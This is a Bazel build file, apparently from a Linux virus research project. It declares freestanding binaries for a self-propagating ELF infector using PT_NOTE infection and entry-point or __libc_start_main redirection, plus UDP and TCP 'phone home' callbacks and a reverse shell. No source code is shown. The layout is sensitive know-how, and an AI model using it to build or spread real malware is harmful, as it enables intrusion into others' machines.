load("//nostdlib:nostdlib.bzl", "cc_nostdlib_binary")

package(default_visibility = ["//visibility:public"])

cc_nostdlib_binary(
    name = "test_virus",
    srcs = ["test_virus.cc"],
    allow_rodata_merging = True,
    deps = [
        "//common:macros",
        "//nostdlib:string",
        "//nostdlib:unistd",
    ],
)

cc_nostdlib_binary(
    name = "self_propagating_virus",
    srcs = ["self_propagating_virus.cc"],
    allow_rodata_merging = True,
    deps = [
        "//common:directory_iterator",
        "//common:macros",
        "//common:recursive_directory_iterator",
        "//infector:pt_note_infector",
        "//propagation:propagate",
        "//redirection:entry_point",
        "//redirection:libc_start_main",
    ],
)

cc_nostdlib_binary(
    name = "self_propagate_libc_start_main",
    srcs = ["self_propagate_libc_start_main.cc"],
    allow_rodata_merging = True,
    deps = [
        "//common:directory_iterator",
        "//common:macros",
        "//infector:pt_note_infector",
        "//propagation:propagate",
        "//redirection:libc_start_main",
    ],
)

cc_nostdlib_binary(
    name = "phone_home_udp",
    srcs = ["phone_home_udp.cc"],
    allow_rodata_merging = True,
    deps = [
        "//common:macros",
        "//nostdlib:string",
        "//nostdlib:unistd",
        "//nostdlib/sys:socket",
    ],
)

cc_nostdlib_binary(
    name = "phone_home_tcp",
    srcs = ["phone_home_tcp.cc"],
    allow_rodata_merging = True,
    deps = [
        "//common:macros",
        "//nostdlib:string",
        "//nostdlib:unistd",
        "//nostdlib/sys:socket",
    ],
)

cc_nostdlib_binary(
    name = "reverse_shell",
    srcs = ["reverse_shell.cc"],
    allow_rodata_merging = False,
    deps = [
        "//common:double_fork",
        "//common:macros",
        "//nostdlib/sys:socket",
    ],
)
